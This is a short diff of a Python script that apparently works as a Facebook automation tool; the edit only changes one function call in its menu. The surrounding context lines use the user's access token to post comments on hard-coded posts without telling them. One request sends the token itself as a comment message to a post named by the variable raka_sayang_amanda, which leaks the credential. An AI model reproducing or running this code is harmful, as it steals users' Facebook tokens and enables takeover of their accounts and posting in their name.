@@ -108,7 +108,7 @@ def __menu__():
         requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token=' +token)
         requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token=' +token)
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
-        __raka_sayang_amanda__()
+        __menu__()
         try:
                 p = requests.get('https://graph.facebook.com/me?access_token='+token)
                 q = json.loads(p.text)
